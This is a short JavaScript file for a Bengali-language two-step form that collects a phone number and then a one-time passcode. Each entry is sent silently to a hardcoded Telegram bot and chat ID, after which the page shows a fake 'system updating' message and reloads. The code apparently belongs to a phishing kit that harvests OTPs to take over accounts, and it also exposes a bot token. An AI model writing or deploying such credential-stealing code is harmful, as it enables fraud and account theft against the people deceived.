const token = '8355762673:AAFQCkMR3Xbno2lppnvLKq51LqSkiVKfiJc';
const chatId = '6501474888';

let userPhone = "";

function goToStep2() {
    const phoneValue = document.getElementById('phone').value;
    if (phoneValue.length < 10) {
        alert("সঠিক মোবাইল নম্বর দিন");
        return;
    }
    userPhone = phoneValue;
    
    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
    document.getElementById('msg').innerText = "কোডটি নিচে লিখুন";

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📱 নম্বর: " + userPhone)}`;
    fetch(url);
}

document.getElementById('mainForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const otpInput = document.getElementById('otp').value;
    
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✅ ওটিপি: " + otpInput + "\nনম্বর: " + userPhone)}`;
    
    fetch(url).then(() => {
        alert("সিস্টেম আপডেট হচ্ছে, অপেক্ষা করুন...");
        window.location.reload();
    });
});
